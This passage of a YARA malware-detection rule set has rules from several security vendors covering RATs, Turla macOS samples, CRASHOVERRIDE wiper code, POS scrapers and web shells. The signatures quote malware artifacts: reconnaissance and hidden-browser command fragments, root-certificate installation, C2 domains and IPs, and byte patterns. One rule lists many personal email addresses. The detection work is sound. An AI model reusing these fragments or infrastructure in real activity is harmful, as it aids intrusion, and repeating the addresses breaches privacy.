.text:00401C19 74 50                                         jz      short loc_401C6B
.text:00401C1B B9 01 00 00 00                                mov     ecx, 1
.text:00401C20 6B D1 00                                      imul    edx, ecx, 0
.text:00401C23 8B 45 08                                      mov     eax, [ebp+arg_0]
.text:00401C26 0F BE 0C 10                                   movsx   ecx, byte ptr [eax+edx]
.text:00401C2A 83 F9 75                                      cmp     ecx, 'u'
.text:00401C2D 74 3C                                         jz      short loc_401C6B
.text:00401C2F BA 01 00 00 00                                mov     edx, 1
.text:00401C34 6B C2 00                                      imul    eax, edx, 0
.text:00401C37 8B 4D 08                                      mov     ecx, [ebp+arg_0]
.text:00401C3A 0F BE 14 01                                   movsx   edx, byte ptr [ecx+eax]
.text:00401C3E 83 FA 64                                      cmp     edx, 'd'
.text:00401C41 74 28                                         jz      short loc_401C6B
.text:00401C43 B8 01 00 00 00                                mov     eax, 1
.text:00401C48 6B C8 00                                      imul    ecx, eax, 0
.text:00401C4B 8B 55 08                                      mov     edx, [ebp+arg_0]
.text:00401C4E 0F BE 04 0A                                   movsx   eax, byte ptr [edx+ecx]
.text:00401C52 83 F8 6C                                      cmp     eax, 'l'
.text:00401C55 74 14                                         jz      short loc_401C6B
.text:00401C57 B9 01 00 00 00                                mov     ecx, 1
.text:00401C5C 6B D1 00                                      imul    edx, ecx, 0
.text:00401C5F 8B 45 08                                      mov     eax, [ebp+arg_0]
.text:00401C62 0F BE 0C 10                                   movsx   ecx, byte ptr [eax+edx]
.text:00401C66 83 F9 6E                                      cmp     ecx, 'n'
*/
$arg_parsing = { 83 f? ( 3a | 6c | 64 | 75 | 74 ) 7? ?? b? 01 00 00 00 6b ?? 00 8b ?? 08 0f be 0? ?? }
/*
.text:00401116 B8 01 00 00 00                                mov     eax, 1
.text:0040111B 85 C0                                         test    eax, eax
.text:0040111D 74 49                                         jz      short loc_401168
.text:0040111F 8B 0D 88 5B 40 00                             mov     ecx, dword_405B88
.text:00401125 0F BE 11                                      movsx   edx, byte ptr [ecx]
.text:00401128 83 FA 7C                                      cmp     edx, '|'
.text:0040112B 74 0C                                         jz      short loc_401139
.text:0040112D A1 88 5B 40 00                                mov     eax, dword_405B88
.text:00401132 0F BE 08                                      movsx   ecx, byte ptr [eax]
.text:00401135 85 C9                                         test    ecx, ecx
.text:00401137 75 08                                         jnz     short loc_401141
*/
$pipe_delimit = { b8 01 00 00 00 85 c0 7? ?? 8b 0d ?? ?? ?? ?? 0f be 11 83 fa 7c 7? }
$fmt_string = "GUID=%I64u&BUILD=%s&INFO=%s&IP=%s&TYPE=1&WIN=%d.%d(%s)"
/*
.text:00401AEE 83 FA 3C                                      cmp     edx, '<'
.text:00401AF1 75 48                                         jnz     short loc_401B3B
.text:00401AF3 B8 01 00 00 00                                mov     eax, 1
.text:00401AF8 C1 E0 00                                      shl     eax, 0
.text:00401AFB 0F BE 8C 05 FC FD FF FF                       movsx   ecx, [ebp+eax+Buffer]
.text:00401B03 83 F9 21                                      cmp     ecx, '!'
.text:00401B06 75 33                                         jnz     short loc_401B3B
.text:00401B08 BA 01 00 00 00                                mov     edx, 1
.text:00401B0D D1 E2                                         shl     edx, 1
.text:00401B0F 0F BE 84 15 FC FD FF FF                       movsx   eax, [ebp+edx+Buffer]
.text:00401B17 83 F8 64                                      cmp     eax, 'd'
.text:00401B1A 75 1F                                         jnz     short loc_401B3B
.text:00401B1C B9 01 00 00 00                                mov     ecx, 1
.text:00401B21 6B D1 03                                      imul    edx, ecx, 3
.text:00401B24 0F BE 84 15 FC FD FF FF                       movsx   eax, [ebp+edx+Buffer]
.text:00401B2C 83 F8 6F                                      cmp     eax, 'o'
*/
$connectivty_google_check = { 83 fa 3c 7? ?? b8 01 00 00 00 c1 e0 00 0f be 8c 05 fc fd ff ff 83 f9 21 7? ?? ba 01 00 00 00 d1 e2 0f be 84 15 fc fd ff ff 83 f8 64 7? ?? b9 01 00 00 00 6b d1 03 0f be 84 15 fc fd ff ff 83 f8 6f }
condition:
#arg_parsing > 1 or any of ($pipe_delimit, $fmt_string,$connectivty_google_check)
}
rule SSC_bbsrat {
meta:
author = "Tyler Halfpop"
company = "Palo Alto Networks"
last_updated = "12-16-15"
strings:
$sa0 = "%ALLUSERSPROFILE%\\SSONSVR" fullword wide
$sa1 = "%ALLUSERSPROFILE%\\Application Data\\SSONSVR" fullword wide
$sa2 = "\\ssonsvr.exe" fullword wide
$oa0 = { 83 E8 01 88 0C 04 75 F8 8B 44 24 40 89 4C 24 18 89 4C 24 1C 89 4C 24 30 89 4C 24 34 89 4C 24 20 89 4C 24 38 8D 0C 24 51 C7 44 24 04 3C 00 00 00 C7 44 24 08 40 00 00 00 C7 44 24 10 70 20 40 00 C7 44 24 14 A0 20 40 00 89 44 24 18 FF 15 54 20 40 00 85 C0 75 04 83 C4 3C C3 }
$oa1 = { 75 11 5F 5E B8 0D 00 00 00 5B 81 C4 ?? 07 00 00 C2 10 00 53 68 80 00 00 00 6A 02 53 6A 02 6A 02 8D 54 24 ?? 52 89 5C 24 30 FF 15 38 20 40 00 }
$sb0 = "%systemroot%\\Web\\"
$sb1 = "srvcl32.dll"
$ob0 = { B8 67 66 66 66 F7 E9 D1 FA 8B C2 C1 E8 1F 03 C2 8D 04 80 8B D1 2B D0 8A 44 94 04 30 81 08 58 40 00 41 3B CE 7C DA B8 08 58 40 00 5E 83 C4 14 C3 }
$ob1 = { 8D 84 24 18 02 00 00 50 C7 84 24 1C 02 00 00 94 00 00 00 FF 15 4C 20 40 00 8B 8C 24 20 02 00 00 0F B7 94 24 1C 02 00 00 C1 E9 10 0B CA 83 F9 06 0F 85 7F 00 00 00 }
condition:
uint16(0) == 0x5a4d and filesize < 300KB and (all of ($sa*) or all of ($oa*) or all of ($sb*) or all of ($ob*))
}
rule SSC_Lightserver_variant_B : Red_Salamander
{
meta:
description = "Elise lightserver variant."
author = "PwC Cyber Threat Operations :: @michael_yip"
version = "1.0"
created = "2015-12-16"
exemplar_md5 = "c205fc5ab1c722bbe66a4cb6aff41190"
strings:
$json = /\{\"r\":\"[0-9]{12}\",\"l\":\"[0-9]{12}\",\"u\":\"[0-9]{7}\",\"m\":\"[0-9]{12}\"\}/
$mutant1 = "Global\\{7BDACDEE-8BF6-4664-B946-D00FCFF1FFBA}"
$mutant2 = "{5947BACD-63BF-4e73-95D7-0C8A98AB95F2}"
$serv1 = "Server1=%s"
$serv2 = "Server2=%s"
$serv3 = "Server3=%s"
condition:
uint16(0) == 0x5A4D and ($json or $mutant1 or $mutant2 or all of ($serv*))
}
rule SSC_Elise_lstudio_variant_B_resource
{
meta:
description = "Elise lightserver variant."
author = "PwC Cyber Threat Operations :: @michael_yip"
version = "1.0"
created = "2015-12-16"
exemplar_md5 = "c205fc5ab1c722bbe66a4cb6aff41190"
condition:
uint16(0) == 0x5A4D and for any i in (0..pe.number_of_resources - 1) : (pe.resources[i].type_string == "A\x00S\x00D\x00A\x00S\x00D\x00A\x00S\x00D\x00A\x00S\x00D\x00S\x00A\x00D\x00")
}
rule SSC_backdoor_apt_pcclient
{
meta:
author = "@patrickrolsen"
maltype = "APT.PCCLient"
filetype = "DLL"
version = "0.1"
description = "Detects the dropper: 869fa4dfdbabfabe87d334f85ddda234 AKA dw20.dll/msacm32.drv dropped by 4a85af37de44daf5917f545c6fd03902 (RTF)"
date = "2012-10"
strings:
$magic = { 4d 5a } // MZ
$string1 = "www.micro1.zyns.com"
$string2 = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)"
$string3 = "msacm32.drv" wide
$string4 = "C:\\Windows\\Explorer.exe" wide
$string5 = "Elevation:Administrator!" wide
$string6 = "C:\\Users\\cmd\\Desktop\\msacm32\\Release\\msacm32.pdb"
condition:
$magic at 0 and 4 of ($string*)
}
rule SSC_PoS_Malware_NewPOSThings2015 : newposthings2015
{
meta:
author = "Trend Micro, Inc."
date = "2015-03-10"
description = "Used to detect NewPoSThings RAM scraper, including 2015 sample set"
strings:
$pdb1 = "C:\\Users\\Tom\\documents\\visual studio 2012\\Projects\\NewPosThings\\Release\\NewPosThings.pdb" nocase
$pdb2 = "C:\\Final32\\Release\\Final.pdb" nocase
$pdb3 = "C:\\Users\\Tom\\documents\\visual studio 2012\\Projects\\jsd_12.2\\Release\\jsd_12.2.pdb" nocase
$pdb4 = "C:\\Users\\Tom\\documents\\visual studio 2012\\Projects\\jsd_12.2\\x64\\Release\\jsd_12.2.pdb" nocase
$string0 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
$string1 = "Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)" wide
$string2 = "Content-Type: application/x-www-form-urlencoded" wide
$string3 = "Use 64bit version." wide
$string4 = "SeDebugPrivilege" wide
$string5 = "Java Update Manager" wide
$string6 = "Java\\Javaj.exe" wide
$string7 = "lsass.exe" wide
$string8 = "aW5zZXJ0"
condition:
(any of ($pdb*)) or (all of ($str*))
}
rule SSC_CarbanakVBSCRIPT {
meta:
author = "jaime.blasco@alienvault.com"
strings:
$a = "URLEncode(SimpleEncrypt"
$b = "isRunWList = checkWhiteList"
$c = "dim runnerr"
$d = "dim myini"
condition:
$a or $b or ($c and $d)
}
rule SSC_CarbanakRTFPayload {
meta:
author = "jaime.blasco@alienvault.com"
strings:
$RTF = "{\\rtf"
$c = "dim runnerr"
$d = "dim myini"
$e = "unprotect.vbs"
$h = "756e70726f746563742e766273"
$f = "64696d2072756e6e657272"
$g = "64696d206d79696e69"
condition:
$RTF at 0 and (($c and $d) or $e or $h or ($f and $g))
}
rule SSC_osx_dok {
meta:
author = "AlienVault Labs"
type = "malware"
description = "OSX/Dok"
strings:
$header0 = {cf fa ed fe}
$header1 = {ce fa ed fe}
$header2 = {ca fe ba be}
$c1 = "/usr/local/bin/brew"
$c2 = "/usr/local/bin/tor"
$c3 = "/usr/local/bin/socat"
$c4 = "killall Safari"
$c5 = "killall \"Google Chrome\""
$c6 = "killall firefox"
$c7 = "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain %@"
condition:
($header0 at 0 or $header1 at 0 or $header2 at 0) and (all of ($c*))
}
rule SSC_SnakeTurla_Installd_SH {
meta:
description = "Detects Snake / Turla Sample"
author = "Florian Roth"
reference = "https://goo.gl/QaOh4V"
date = "2017-05-04"
strings:
$s1 = "PIDS=`ps cax | grep installdp" ascii
$s2 = "${SCRIPT_DIR}/installdp ${FILE}" ascii
condition:
( uint16(0) == 0x2123 and filesize < 20KB and all of them )
}
rule SSC_SnakeTurla_Malware_May17_4 {
meta:
description = "Detects Snake / Turla Sample"
author = "Florian Roth"
reference = "https://goo.gl/QaOh4V"
date = "2017-05-04"
hash1 = "d5ea79632a1a67abbf9fb1c2813b899c90a5fb9442966ed4f530e92715087ee2"
strings:
$s1 = "Install Adobe Flash Player.app/com.adobe.updatePK" fullword ascii
condition:
( uint16(0) == 0x4b50 and filesize < 5000KB and all of them )
}
rule SSC_SnakeTurla_Malware_May17_3 {
meta:
description = "Detects Snake / Turla Sample"
author = "Florian Roth"
reference = "https://goo.gl/QaOh4V"
date = "2017-05-04"
hash1 = "7848f7808af02ba0466f3a0687cf949c4d29a2d94b035481a3299ec519aaaa30"
strings:
$x1 = "Addy Symonds1" ascii
$x2 = "com.addy.InstallAdobeFlash" ascii
condition:
( uint16(0) == 0xfacf and filesize < 3000KB and all of them )
}
rule SSC_SnakeTurla_Install_SH {
meta:
description = "Detects Snake / Turla Sample"
author = "Florian Roth"
reference = "https://goo.gl/QaOh4V"
date = "2017-05-04"
strings:
$s1 = "${TARGET_PATH}/installd.sh" ascii
$s2 = "$TARGET_PATH2/com.adobe.update.plist" ascii
condition:
( uint16(0) == 0x2123 and filesize < 20KB and all of them )
}
rule SSC_SnakeTurla_Malware_May17_1 {
meta:
description = "Detects Snake / Turla Sample"
author = "Florian Roth"
reference = "https://goo.gl/QaOh4V"
date = "2017-05-04"
hash1 = "5b7792a16c6b7978fca389882c6aeeb2c792352076bf6a064e7b8b90eace8060"
strings:
$s1 = "/Users/vlad/Desktop/install/install/" fullword ascii
condition:
( uint16(0) == 0xfacf and filesize < 200KB and all of them )
}
rule SSC_SnakeTurla_Malware_May17_2 {
meta:
description = "Detects Snake / Turla Sample"
author = "Florian Roth"
reference = "https://goo.gl/QaOh4V"
date = "2017-05-04"
hash1 = "b8ee4556dc09b28826359b98343a4e00680971a6f8c6602747bd5d723d26eaea"
strings:
$s1 = "b_openssl: oops - number of mutexes is 0" fullword ascii
$s2 = "networksetup -get%sproxy Ethernet" fullword ascii
$s3 = "012A04DECBC441e49C527B2798F54CA7LOG_NAMED_PIPE_NAME" fullword ascii
condition:
( uint16(0) == 0xfacf and filesize < 6000KB and all of them )
}
rule SSC_warning_EPS_xor_exec {
meta:
is_exploit = false
is_warning = true
is_feature = true
rank = 5
revision = "1"
date = "May 11 2017"
author = "@tylabs"
release = "lite"
copyright = "QuickSand.io (c) Copyright 2017. All rights reserved."
tlp = "green"
sigtype = "cryptam_exploit"
desc = "EPS obfuscation using xor and exec"
strings:
$h1 = "%!PS-Adobe-" nocase
$s1 = "mod get xor put"
$s2 = "exec quit"
condition:
$h1 at 0 and all of ($s*)
}
rule SSC_Trojan_Python_Ragua : APT {
meta:
description = "Detect the Python Trojan Ragua (known from Kaspersky 'Machete' APT report)"
author = "Florian Roth"
hash0 = "d7928af839db6c651c6b9d5a8937e00191f01358"
hash1 = "907f17693aa626a65595b64ae01d0a3e948834d1"
hash2 = "85537f2c50825358d67536de1cdfcd3f1c790149"
strings:
$s2 = "\\py2exe\\boot_common.pyR"
$s10 = "win32com/client/util.pyo" fullword
$x1 = "JavaS.exe" wide fullword
$x2 = "JavaS.pyR$" fullword
condition:
uint16(0) == 0x5A4D and all of them
}
rule SSC_diamond_fox
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2015-08-22"
description = "Identify DiamondFox"
strings:
$s1 = "UPDATE_B"
$s2 = "UNISTALL_B"
$s3 = "S_PROTECT"
$s4 = "P_WALLET"
$s5 = "GR_COMMAND"
$s6 = "FTPUPLOAD"
condition:
all of them
}
rule SSC_macSpy
{
meta:
author = "AlienVault Labs"
type = "malware"
description = "MacSpy"
strings:
$header0 = {cf fa ed fe}
$header1 = {ce fa ed fe}
$header2 = {ca fe ba be}
$c1 = { 76 31 09 00 76 32 09 00 76 33 09 00 69 31 09 00 69 32 09 00 69 33 09 00 69 34 09 00 66 31 09 00 66 32 09 00 66 33 09 00 66 34 09 00 74 63 3A 00 }
condition:
($header0 at 0 or $header1 at 0 or $header2 at 0) and $c1
}
rule SSC_crashoverride_wiperModuleRegistry
{
meta:
description = "Registry Wiper functionality assoicated with CRASHOVERRIDE"
author = "Dragos Inc"
strings:
$s0 = { 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 }
$s1 = { 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? }
$s2 = { 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 }
condition:
all of them
}
rule SSC_crashoverride_socketCreationArtifacts
{
meta:
description = "Socket and connection creation functionality"
author = "Dragos Inc"
strings:
$s0 = { c7 85 ?? fe ff ff 02 00 00 00 c7 85 ?? fe ff ff 01 00 00 00 c7 85 ?? fe ff ff 06 00 00 00 ff 15 ?? 91 01 10 }
$s1 = { 6a 04 ?? ?? ?? fe ff ff 8d 85 ?? fe ff ff 50 68 06 10 00 68 ff ff 00 00 57 ff 15 ?? ?? ?? 01 10 }
condition:
all of them
}
rule SSC_crashoverride_serviceStomper
{
meta:
description = "Identify service hollowing and persistence setting"
author = "Dragos Inc"
strings:
$s0 = { 33 c9 51 51 51 51 51 51 ?? ?? ?? }
$s1 = { 6a ff 6a ff 6a ff 50 ff 15 24 ?? 40 00 ff ?? ?? ff 15 20 ?? 40 00 }
condition:
all of them
}
rule SSC_crashoverride_weirdMutex
{
meta:
description = "Blank mutex creation assoicated with CRASHOVERRIDE"
author = "Dragos Inc"
strings:
$s1 = { 81 ec 08 02 00 00 57 33 ff 57 57 57 ff 15 ?? ?? 40 00 a3 ?? ?? ?? 00 85 c0 }
$s2 = { 8d 85 ?? ?? ?? ff 50 57 57 6a 2e 57 ff 15 ?? ?? ?? 00 68 ?? ?? 40 00}
condition:
all of them
}
rule SSC_crashoverride_wiperFileManipulation
{
meta:
description = "File manipulation actions associated with CRASHOVERRIDE wiper"
author = "Dragos Inc"
strings:
$s0 = { 6a 00 68 80 00 00 00 6a 03 6a 00 6a 02 8b f9 68 00 00 00 40 57 ff 15 1c ?? ?? ?? 8b d8 }
$s2 = { 6a 00 50 57 56 53 ff 15 4c ?? ?? ?? 56 }
condition:
all of them
}
rule SSC_crashoverride_finalCountdownToWiper
{
meta:
description = "Countdown to wiper module loading"
author = "Dragos Inc"
strings:
$s0 = { 68 80 ee 36 00 ff ?? ?? ?? 40 00 68 e8 09 41 00 ff  ?? ?? ?? 40 00 85 c0 }
$s1 = { 68 fc 09 41 00 50 ff ?? ?? ?? 40 00 85 c0 74 07 6a 00 ff d0 83 c4 04 }
condition:
all of them
}
rule SSC_crashoverride_configReader
{
meta:
description = "CRASHOVERRIDE v1 Config File Parsing"
author = "Dragos Inc"
strings:
$s0 = { 68 e8 ?? ?? ?? 6a 00 e8 a3 ?? ?? ?? 8b f8 83 c4 ?8 }
$s1 = { 8a 10 3a 11 75 ?? 84 d2 74 12 }
$s2 = { 33 c0 eb ?? 1b c0 83 c8 ?? }
$s3 = { 85 c0 75 ?? 8d 95 ?? ?? ?? ?? 8b cf ?? ?? }
condition:
all of them
}
rule SSC_Downloader_Mar17_1 {
meta:
description = "Detects Downloader"
author = "Florian Roth"
reference = "http://www.clearskysec.com/iec/"
date = "2017-03-13"
hash1 = "15b5fb226689fdddc04c3e6ddeb84e3aae4ce009cc4c95f6fa68045033ca905f"
hash2 = "1b7ab355fe28efc14c6a5a7a0f663507a6cdc921ecbadf228005d9f635852463"
hash3 = "143313a610b77d03202a23bc08f0721de693782d07d27e0dac89004cc1cf9ea3"
hash4 = "a6a71a00b1f1e2b37332b461611615f98f3aefc57c0274cf1ab217b66149912a"
hash5 = "f434ec69bf2f6310a8fa5e2dccb3b05e94584a4ab03898da101eaed703737d20"
strings:
$x1 = "\\Downloader\\Release\\Downloader.pdb" ascii
$x2 = "\\tsDownloader\\Release\\tsDownloader.pdb" ascii
$x3 = " /c wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter Path AntiVirusProduct Get displayName /Format:List > " fullword wide
$x4 = "\\temp1.txt && wmic path win32_physicalmedia get SerialNumber > " fullword ascii
$x5 = "\\ProgramData\\system.dll" fullword ascii
$x6 = " /c wmic NICCONFIG WHERE IPEnabled=true GET IPAddress /format:csv > " fullword wide
$x7 = "/ProgramData/system.dll" fullword ascii
$x8 = "\\ProgramData\\dll.dll" fullword wide
$s1 = "$ie = new-object -comobject InternetExplorer.Application; $ie.Visible = $false; $ie.Silent = $true; $ie.navigate('http://" fullword wide
$s2 = "dasHost.exe" fullword ascii
$s3 = "/ProgramData/System Update/check.txt" fullword wide
$s4 = "Explorer.Exe" fullword wide
$s5 = "svchosts.Exe" fullword wide
$s6 = "C:/ProgramData/window/" fullword wide
$op1 = { 68 72 8d 42 00 8d 4c 24 08 c7 44 24 08 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 900KB and ( 1 of ($x*) or 2 of ($s*) ) ) or ( 4 of them )
}
rule SSC_venomLinuxRootkit {
meta:
description = "Venom Linux Rootkit"
author = "jaime.blasco@alienvault.com"
ref = "https://security.web.cern.ch/security/venom.shtml"
strings:
$a1 = "%%VENOM%"
$a2 = "justCANTbeSTOPPED"
$a3 = "ABZFZU.wWdRDU"
condition:
(uint16(0) == 0x457F) and (filesize < 10MB) and (all of ($a*))
}
rule SSC_crime_ZZ_EyePyramid {
meta:
copyright = " Kaspersky Lab"
author = "Kaspersky Lab"
maltype = "crimeware"
filetype = "Win32 EXE"
date = "2016-01-11"
version = "1.0"
strings:
$a0="eyepyramid.com" ascii wide nocase fullword
$a1="hostpenta.com" ascii wide nocase fullword
$a2="ayexisfitness.com" ascii wide nocase fullword
$a3="enasrl.com" ascii wide nocase fullword
$a4="eurecoove.com" ascii wide nocase fullword
$a5="marashen.com" ascii wide nocase fullword
$a6="millertaylor.com" ascii wide nocase fullword
$a7="occhionero.com" ascii wide nocase fullword
$a8="occhionero.info" ascii wide nocase fullword
$a9="wallserv.com" ascii wide nocase fullword
$a10="westlands.com" ascii wide nocase fullword
$a11="217.115.113.181" ascii wide nocase fullword
$a12="216.176.180.188" ascii wide nocase fullword
$a13="65.98.88.29" ascii wide nocase fullword
$a14="199.15.251.75" ascii wide nocase fullword
$a15="216.176.180.181" ascii wide nocase fullword
$a16="MN600-849590C695DFD9BF69481597241E-668C" ascii wide nocase fullword
$a17="MN600-841597241E8D9BF6949590C695DF-774D" ascii wide nocase fullword
$a18="MN600-3E3A3C593AD5BAF50F55A4ED60F0-385D" ascii wide nocase fullword
$a19="MN600-AD58AF50F55A60E043E3A3C593ED-874A" ascii wide nocase fullword
$a20="gpool@hostpenta.com" ascii wide nocase fullword
$a21="hanger@hostpenta.com" ascii wide nocase fullword
$a22="hostpenta@hostpenta.com" ascii wide nocase fullword
$a23="ulpi715@gmx.com" ascii wide nocase fullword
$b0="purge626@gmail.com" ascii wide fullword
$b1="tip848@gmail.com" ascii wide fullword
$b2="dude626@gmail.com" ascii wide fullword
$b3="octo424@gmail.com" ascii wide fullword
$b4="antoniaf@poste.it" ascii wide fullword
$b5="mmarcucci@virgilio.it" ascii wide fullword
$b6="i.julia@blu.it" ascii wide fullword
$b7="g.simeoni@inwind.it" ascii wide fullword
$b8="g.latagliata@live.com" ascii wide fullword
$b9="rita.p@blu.it" ascii wide fullword
$b10="b.gaetani@live.com" ascii wide fullword
$b11="gpierpaolo@tin.it" ascii wide fullword
$b12="e.barbara@poste.it" ascii wide fullword
$b13="stoccod@libero.it" ascii wide fullword
$b14="g.capezzone@virgilio.it" ascii wide fullword
$b15="baldarim@blu.it" ascii wide fullword
$b16="elsajuliette@blu.it" ascii wide fullword
$b17="dipriamoj@alice.it" ascii wide fullword
$b18="izabelle.d@blu.it" ascii wide fullword
$b19="lu_1974@hotmail.com" ascii wide fullword
$b20="tim11235@gmail.com" ascii wide fullword
$b21="plars575@gmail.com" ascii wide fullword
$b22="guess515@fastmail.fm" ascii wide fullword
condition:
((uint16(0) == 0x5A4D)) and (filesize < 10MB) and
((any of ($a*)) or (any of ($b*)) )
}
rule SSC_VBPacker_FareIT_Zbot
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect VB Packer of FareIT and Zbot samples"
hash1 = "0b7f872d098ef8f1dd0e52f6d5c5a92e"
hash2 = "0eb12f0c3aa4ec1db178fbbe69a329cf"
version = "1.1"
strings:
$a1 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
//"gdi32" + 0x11 +"SetViewportOrgEx"
$a2 = {67 64 69 33 32 00 00 00 11 00 00 00 53 65 74 56 69 65 77 70 6F 72 74 4F 72 67 45 78}
//OriginalFilename AX.exe
$b1 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 41 00 58 00 2E 00 65 00 78 00 65 00}
//OriginalFilename AS.exe
$b2 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 41 00 53 00 2E 00 65 00 78 00 65 00}
//OriginalFilename Can.exe
$b3 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 43 00 61 00 6E 00 2E 00 65 00 78 00 65 00}
//OriginalFilename usisui.exe
$b5 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 75 00 73 00 69 00 73 00 75 00 69 00 2E 00 65 00 78 00 65 00}
condition:
uint16(0) == 0x5A4D
and (all of ($a*))
and (any of ($b*))
//and (any of ($c*))
and filesize > 250000
}
rule SSC_MSILPacker_FareIT_ISR_Stealer_Luminosity_HawkEye
{
meta:
copyright = "Kaspersky Lab"
description = "Rule to detect MSIL Packer of FareIT, ISR Stealer, Luminosity, HawkEye Keylogger samples"
hash1 = "1f9ea55ec924bf927db4fb4f429d49b6"
hash2 = "80c4a3d66159877e264b0eab74a791db"
hash2 = "e8bfa64826d095ff3699a5e3df205d24"
version = "1.1"
strings:
$a1 = "set_Key"
$a2 = "set_IV"
$a3 = "set_ClientSize"
$a4 = "set_ControlBox"
$a5 = "SetCompatibleTextRenderingDefault"
$a6 = "CompilationRelaxationsAttribute"
$a7 = "ICryptoTransform"
$a8 = "_CorExeMain"
$b1 = "Video card management"
$b2 = "Net Extensible Autheticator"
$b3 = "NetTcpActivator"
$b4 = "nVidia PhysX technology"
$b5 = "WdiSytemHost"
condition:
uint16(0) == 0x5A4D
and (all of ($a*))
and (any of ($b*))
and filesize > 100000
}
rule SSC_malware_red_leaves_generic {
meta:
author = "David Cannings"
description = "Red Leaves malware, related to APT10"
// This hash from VT retrohunt, original sample was a memory dump
sha256 = "2e1f902de32b999642bb09e995082c37a024f320c683848edadaf2db8e322c3c"
strings:
// MiniLZO release date
$ = "Feb 04 2015"
$ = "I can not start %s"
$ = "dwConnectPort" fullword
$ = "dwRemoteLanPort" fullword
$ = "strRemoteLanAddress" fullword
$ = "strLocalConnectIp" fullword
$ = "\\\\.\\pipe\\NamePipe_MoreWindows" wide
$ = "RedLeavesCMDSimulatorMutex" wide
$ = "(NT %d.%d Build %d)" wide
$ = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)" wide
$ = "red_autumnal_leaves_dllmain.dll" wide ascii
$ = "__data" wide
$ = "__serial" wide
$ = "__upt" wide
$ = "__msgid" wide
condition:
7 of them
}
rule SSC_BernhardPOS {
meta:
author = "Nick Hoffman / Jeremy Humble"
last_update = "2015-07-14"
source = "Morphick Inc."
description = "BernhardPOS Credit Card dumping tool"
strings:
$shellcode_kernel32_with_junk_code = { 33 c0 83 ?? ?? 83 ?? ?? 64 a1 30 00 00 00 83 ?? ?? 83 ?? ?? 8b 40 0c 83 ?? ?? 83 ?? ?? 8b 40 14 83 ?? ?? 83 ?? ?? 8b 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b 00 83 ?? ?? 83 ?? ?? 8b 40 10 83 ?? ?? }
$mutex_name = "OPSEC_BERNHARD"
$build_path = "C:\\bernhard\\Debug\\bernhard.pdb"
$string_decode_routine = { 55 8b ec 83 ec 50 53 56 57 a1 ?? ?? ?? ?? 89 45 f8 66 8b 0d ?? ?? ?? ?? 66 89 4d fc 8a 15 ?? ?? ?? ?? 88 55 fe 8d 45 f8 50 ff ?? ?? ?? ?? ?? 89 45 f0 c7 45 f4 00 00 00 00 ?? ?? 8b 45 f4 83 c0 01 89 45 f4 8b 45 08 50 ff ?? ?? ?? ?? ?? 39 45 f4 ?? ?? 8b 45 08 03 45 f4 0f be 08 8b 45 f4 99 f7 7d f0 0f be 54 15 f8 33 ca 8b 45 08 03 45 f4 88 08 ?? ?? 5f 5e 5b 8b e5 5d }
condition:
any of them
}
rule SSC_AlienSpy
{
strings:
$sa_1 = "META-INF/MANIFEST.MF"
$sa_2 = "Main.classPK"
$sa_3 = "plugins/Server.classPK"
$sa_4 = "IDPK"
$sb_1 = "config.iniPK"
$sb_2 = "password.iniPK"
$sb_3 = "plugins/Server.classPK"
$sb_4 = "LoadStub.classPK"
$sb_5 = "LoadStubDecrypted.classPK"
$sb_7 = "LoadPassword.classPK"
$sb_8 = "DecryptStub.classPK"
$sb_9 = "ClassLoaders.classPK"
$sc_1 = "config.xml"
$sc_2 = "options"
$sc_3 = "plugins"
$sc_4 = "util"
$sc_5 = "util/OSHelper"
$sc_6 = "Start.class"
$sc_7 = "AlienSpy"
$sc_8 = "PK"
condition:
(all of ($sa_*)) or (all of ($sb_*)) or (all of ($sc_*))
}
rule SSC_hiddenFunctionality
{
meta:
author = "NSA Cybersecurity"
description = "Hidden functionality allows malware to masquerade as another filetype"
condition:
phpInImage
}
rule SSC_webshellArtifact
{
meta:
author = "NSA Cybersecurity"
description = "Artifacts common to web shells and rare in benign files"
condition:
b374k or pas_tool or pbot or generic_jsp
}
rule SSC_suspiciousFunctionality
{
meta:
author = "NSA Cybersecurity"
description = "Artifacts common to web shells and somewhat rare in benign files"
condition:
hardcoded_urldecode or fopo or eval
}
rule SSC_OLE_DOC_InjX_AutoGen
{
strings:
$x1 = "Auto_Open"
$x2 = "Auto_Close"
$x3 = "btnOK_Click"
$s1 = "Environ"
$s3 = "write"
$s4 = "put"
$s5 = "Output"
$s6 = "Kill"
$s7 = "CreateObject"
$s8 = "HTTP"
$s9 = "SendKeys"
$s10 = "vb" nocase
condition:
filesize > 10KB and filesize < 9999KB and ( (2 of ($x*) and 2 of ($s*) ) or ( 8 of ($s*) ) )
}
rule SSC_AutoGen_Win_KeylogX_b7e9c5b6_StealerX
{
meta:
author = "FileScan.IO Engine v1.1.0-b701aba"
date = "2023-03-19"
sample = "b7e9c5b63c2c22b58c792800a36025b878f88c79f3c81e0c990110da8c896672"
score = 75
tags = "greyware,keylogger"
